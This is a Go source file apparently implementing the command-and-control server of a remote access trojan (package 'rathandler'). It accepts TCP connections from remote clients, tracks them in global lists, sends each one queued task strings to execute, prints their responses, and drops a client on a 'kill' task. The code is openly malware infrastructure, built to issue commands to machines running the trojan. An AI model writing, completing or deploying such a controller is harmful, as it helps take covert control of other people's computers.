package rathandler

import (
	"fmt"
	"net"
)

var (
	ClientsConnected int
)
var StringClients []string
var Clients []net.Conn
var Tasks []string

type TCPServer struct {
	listener net.Listener
	running  bool
	Addr     string
}

func NewTCPServer() *TCPServer {
	return &TCPServer{}
}

func (s *TCPServer) Start() error {
	go func() {
		// check if clients are alive or not
		for i, client := range Clients {
			if _, err := client.Write([]byte{}); err != nil {
				// client is dead, remove it from the list
				Clients = append(Clients[:i], Clients[i+1:]...)
				StringClients = append(StringClients[:i], StringClients[i+1:]...)
				ClientsConnected--
			}
		}
	}()
	if s.running {
		return fmt.Errorf("server is already running")
	}
	ln, err := net.Listen("tcp", s.Addr)
	if err != nil {
		return err
	}
	s.listener = ln
	s.running = true
	go s.handleConnections()
	return nil
}

func (s *TCPServer) Stop() error {
	for client := range Clients {
		Clients[client].Close()
	}
	Clients = []net.Conn{}
	StringClients = []string{}
	if !s.running {
		return fmt.Errorf("server is not running")
	}
	s.running = false
	return s.listener.Close()
}

func (s *TCPServer) handleConnections() {
	for s.running {
		conn, err := s.listener.Accept()
		if err != nil {
			if !s.running {
				break
			}
			fmt.Println(err)
			continue
		}
		Clients = append(Clients, conn)
		StringClients = append(StringClients, conn.RemoteAddr().String())
		go s.handleConnection(conn)
	}
}

func (s *TCPServer) handleConnection(conn net.Conn) {
	defer conn.Close() // Close the connection when done

	fmt.Println("new connection from", conn.RemoteAddr())
	for {
		// Check Tasks slice for any new tasks
		if len(Tasks) > 0 {
			// Process the first task in the slice
			task := Tasks[0]
			fmt.Println("Processing task:", task)

			switch task {
			case "kill":
				fmt.Println("Killing all connections")
				for i, client := range Clients {
					if client == conn {
						client.Close()
						// Clients = make([]net.Conn, len(Clients)-1)
						// StringClients = make([]string, len(StringClients)-1)
						Clients = append(Clients[:i], Clients[i+1:]...)
						StringClients = append(StringClients[:i], StringClients[i+1:]...)
						ClientsConnected--
						newStrings := make([]string, 0, len(Tasks))
						for _, s := range Tasks {
							if s != task {
								newStrings = append(newStrings, s)
							}
						}
						Tasks = newStrings
						fmt.Println("Task completed, remaining tasks:", Tasks)
						fmt.Println("Connection closed")
						break
					}
				}
				return
			default:
				conn.Write([]byte(task))
				// Read the response from the client
				buffer := make([]byte, 1024)
				n, err := conn.Read(buffer)
				if err != nil {
					fmt.Println("Error reading from connection:", err)
					return
				}
				fmt.Println("Received response:", string(buffer[:n]))
				newStrings := make([]string, 0, len(Tasks))
				for _, s := range Tasks {
					if s != task {
						newStrings = append(newStrings, s)
					}
				}
				Tasks = newStrings
				fmt.Println("Task completed, remaining tasks:", Tasks)
			}

			// Iterate over the slice and build a new slice with the desired elements

		}
	}
}
